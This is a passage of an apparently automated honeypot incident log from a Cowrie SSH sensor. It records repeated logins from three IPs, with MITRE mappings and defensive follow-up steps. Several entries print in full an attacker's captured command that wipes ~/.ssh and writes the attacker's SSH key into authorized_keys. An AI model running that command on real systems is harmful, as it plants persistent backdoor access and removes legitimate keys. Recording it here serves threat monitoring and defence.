| **First Seen** | 2026-06-12 11:07 |
| **Last Seen** | 2026-06-12 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:07:20` | `cowrie.session.connect` |
| `2026-06-12 11:07:20` | `cowrie.client.version` |
| `2026-06-12 11:07:20` | `cowrie.client.kex` |
| `2026-06-12 11:07:21` | `cowrie.login.success` |
| `2026-06-12 11:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ae6666cc4e

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:09 |
| **Last Seen** | 2026-06-12 11:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:09:12` | `cowrie.session.connect` |
| `2026-06-12 11:09:12` | `cowrie.client.version` |
| `2026-06-12 11:09:12` | `cowrie.client.kex` |
| `2026-06-12 11:09:12` | `cowrie.login.success` |
| `2026-06-12 11:09:13` | `cowrie.session.params` |
| `2026-06-12 11:09:13` | `cowrie.command.input` |
| `2026-06-12 11:09:13` | `cowrie.command.failed` |
| `2026-06-12 11:09:13` | `cowrie.log.closed` |
| `2026-06-12 11:09:13` | `cowrie.session.params` |
| `2026-06-12 11:09:13` | `cowrie.command.input` |
| `2026-06-12 11:09:13` | `cowrie.session.file_download` |
| `2026-06-12 11:09:13` | `cowrie.log.closed` |
| `2026-06-12 11:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acf7470ed427

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:09 |
| **Last Seen** | 2026-06-12 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:09:15` | `cowrie.session.connect` |
| `2026-06-12 11:09:15` | `cowrie.client.version` |
| `2026-06-12 11:09:16` | `cowrie.client.kex` |
| `2026-06-12 11:09:16` | `cowrie.login.success` |
| `2026-06-12 11:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79bbe1c3415f

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:12 |
| **Last Seen** | 2026-06-12 11:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:12:08` | `cowrie.session.connect` |
| `2026-06-12 11:12:08` | `cowrie.client.version` |
| `2026-06-12 11:12:08` | `cowrie.client.kex` |
| `2026-06-12 11:12:09` | `cowrie.login.success` |
| `2026-06-12 11:12:09` | `cowrie.session.params` |
| `2026-06-12 11:12:09` | `cowrie.command.input` |
| `2026-06-12 11:12:09` | `cowrie.command.failed` |
| `2026-06-12 11:12:10` | `cowrie.log.closed` |
| `2026-06-12 11:12:10` | `cowrie.session.params` |
| `2026-06-12 11:12:10` | `cowrie.command.input` |
| `2026-06-12 11:12:10` | `cowrie.session.file_download` |
| `2026-06-12 11:12:10` | `cowrie.log.closed` |
| `2026-06-12 11:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983b1740e81a

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:12 |
| **Last Seen** | 2026-06-12 11:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:12:12` | `cowrie.session.connect` |
| `2026-06-12 11:12:12` | `cowrie.client.version` |
| `2026-06-12 11:12:12` | `cowrie.client.kex` |
| `2026-06-12 11:12:13` | `cowrie.login.success` |
| `2026-06-12 11:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6556542c294b

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:16 |
| **Last Seen** | 2026-06-12 11:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:16:02` | `cowrie.session.connect` |
| `2026-06-12 11:16:02` | `cowrie.client.version` |
| `2026-06-12 11:16:02` | `cowrie.client.kex` |
| `2026-06-12 11:16:03` | `cowrie.login.success` |
| `2026-06-12 11:16:03` | `cowrie.session.params` |
| `2026-06-12 11:16:03` | `cowrie.command.input` |
| `2026-06-12 11:16:03` | `cowrie.command.failed` |
| `2026-06-12 11:16:03` | `cowrie.log.closed` |
| `2026-06-12 11:16:04` | `cowrie.session.params` |
| `2026-06-12 11:16:04` | `cowrie.command.input` |
| `2026-06-12 11:16:04` | `cowrie.session.file_download` |
| `2026-06-12 11:16:04` | `cowrie.log.closed` |
| `2026-06-12 11:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e950146141

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:16 |
| **Last Seen** | 2026-06-12 11:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:16:06` | `cowrie.session.connect` |
| `2026-06-12 11:16:06` | `cowrie.client.version` |
| `2026-06-12 11:16:06` | `cowrie.client.kex` |
| `2026-06-12 11:16:07` | `cowrie.login.success` |
| `2026-06-12 11:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe1762024e4

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:18 |
| **Last Seen** | 2026-06-12 11:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:18:00` | `cowrie.session.connect` |
| `2026-06-12 11:18:00` | `cowrie.client.version` |
| `2026-06-12 11:18:00` | `cowrie.client.kex` |
| `2026-06-12 11:18:01` | `cowrie.login.success` |
| `2026-06-12 11:18:01` | `cowrie.session.params` |
| `2026-06-12 11:18:01` | `cowrie.command.input` |
| `2026-06-12 11:18:01` | `cowrie.command.failed` |
| `2026-06-12 11:18:01` | `cowrie.log.closed` |
| `2026-06-12 11:18:02` | `cowrie.session.params` |
| `2026-06-12 11:18:02` | `cowrie.command.input` |
| `2026-06-12 11:18:02` | `cowrie.session.file_download` |
| `2026-06-12 11:18:02` | `cowrie.log.closed` |
| `2026-06-12 11:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ecd9d252260

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:18 |
| **Last Seen** | 2026-06-12 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:18:04` | `cowrie.session.connect` |
| `2026-06-12 11:18:04` | `cowrie.client.version` |
| `2026-06-12 11:18:04` | `cowrie.client.kex` |
| `2026-06-12 11:18:05` | `cowrie.login.success` |
| `2026-06-12 11:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc512e45ca6

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:20 |
| **Last Seen** | 2026-06-12 11:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:20:04` | `cowrie.session.connect` |
| `2026-06-12 11:20:04` | `cowrie.client.version` |
| `2026-06-12 11:20:04` | `cowrie.client.kex` |
| `2026-06-12 11:20:04` | `cowrie.login.success` |
| `2026-06-12 11:20:05` | `cowrie.session.params` |
| `2026-06-12 11:20:05` | `cowrie.command.input` |
| `2026-06-12 11:20:05` | `cowrie.command.failed` |
| `2026-06-12 11:20:05` | `cowrie.log.closed` |
| `2026-06-12 11:20:05` | `cowrie.session.params` |
| `2026-06-12 11:20:05` | `cowrie.command.input` |
| `2026-06-12 11:20:05` | `cowrie.session.file_download` |
| `2026-06-12 11:20:05` | `cowrie.log.closed` |
| `2026-06-12 11:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a596b6f46c

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:20 |
| **Last Seen** | 2026-06-12 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:20:07` | `cowrie.session.connect` |
| `2026-06-12 11:20:07` | `cowrie.client.version` |
| `2026-06-12 11:20:08` | `cowrie.client.kex` |
| `2026-06-12 11:20:08` | `cowrie.login.success` |
| `2026-06-12 11:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0457d7ff328

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:20 |
| **Last Seen** | 2026-06-12 11:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:20:27` | `cowrie.session.connect` |
| `2026-06-12 11:20:27` | `cowrie.client.version` |
| `2026-06-12 11:20:28` | `cowrie.client.kex` |
| `2026-06-12 11:20:28` | `cowrie.login.success` |
| `2026-06-12 11:20:28` | `cowrie.session.params` |
| `2026-06-12 11:20:28` | `cowrie.command.input` |
| `2026-06-12 11:20:28` | `cowrie.command.failed` |
| `2026-06-12 11:20:29` | `cowrie.log.closed` |
| `2026-06-12 11:20:29` | `cowrie.session.params` |
| `2026-06-12 11:20:29` | `cowrie.command.input` |
| `2026-06-12 11:20:29` | `cowrie.session.file_download` |
| `2026-06-12 11:20:29` | `cowrie.log.closed` |
| `2026-06-12 11:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bcbcdfd4711

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:20 |
| **Last Seen** | 2026-06-12 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:20:38` | `cowrie.session.connect` |
| `2026-06-12 11:20:38` | `cowrie.client.version` |
| `2026-06-12 11:20:38` | `cowrie.client.kex` |
| `2026-06-12 11:20:39` | `cowrie.login.success` |
| `2026-06-12 11:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d86d8df6a2e

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:34 |
| **Last Seen** | 2026-06-12 11:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:34:24` | `cowrie.session.connect` |
| `2026-06-12 11:34:24` | `cowrie.client.version` |
| `2026-06-12 11:34:24` | `cowrie.client.kex` |
| `2026-06-12 11:34:24` | `cowrie.login.success` |
| `2026-06-12 11:34:25` | `cowrie.session.params` |
| `2026-06-12 11:34:25` | `cowrie.command.input` |
| `2026-06-12 11:34:25` | `cowrie.command.failed` |
| `2026-06-12 11:34:25` | `cowrie.log.closed` |
| `2026-06-12 11:34:25` | `cowrie.session.params` |
| `2026-06-12 11:34:25` | `cowrie.command.input` |
| `2026-06-12 11:34:25` | `cowrie.session.file_download` |
| `2026-06-12 11:34:25` | `cowrie.log.closed` |
| `2026-06-12 11:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b398383aff2a

| Field | Detail |
|---|---|
| **Source IP** | `175.182.37[.]66` |
| **First Seen** | 2026-06-12 11:34 |
| **Last Seen** | 2026-06-12 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:34:34` | `cowrie.session.connect` |
| `2026-06-12 11:34:34` | `cowrie.client.version` |
| `2026-06-12 11:34:35` | `cowrie.client.kex` |
| `2026-06-12 11:34:35` | `cowrie.login.success` |
| `2026-06-12 11:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.182.37[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.182.37[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7d5ac35c15

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:35 |
| **Last Seen** | 2026-06-12 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:35:58` | `cowrie.session.connect` |
| `2026-06-12 11:35:58` | `cowrie.client.version` |
| `2026-06-12 11:35:58` | `cowrie.client.kex` |
| `2026-06-12 11:35:58` | `cowrie.login.success` |
| `2026-06-12 11:35:58` | `cowrie.session.params` |
| `2026-06-12 11:35:58` | `cowrie.command.input` |
| `2026-06-12 11:35:58` | `cowrie.command.failed` |
| `2026-06-12 11:35:58` | `cowrie.log.closed` |
| `2026-06-12 11:35:58` | `cowrie.session.params` |
| `2026-06-12 11:35:58` | `cowrie.command.input` |
| `2026-06-12 11:35:58` | `cowrie.session.file_download` |
| `2026-06-12 11:35:58` | `cowrie.log.closed` |
| `2026-06-12 11:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a0285cef17

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:35 |
| **Last Seen** | 2026-06-12 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:35:59` | `cowrie.session.connect` |
| `2026-06-12 11:35:59` | `cowrie.client.version` |
| `2026-06-12 11:35:59` | `cowrie.client.kex` |
| `2026-06-12 11:35:59` | `cowrie.login.success` |
| `2026-06-12 11:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85a61dec1b4

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 11:39 |
| **Last Seen** | 2026-06-12 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
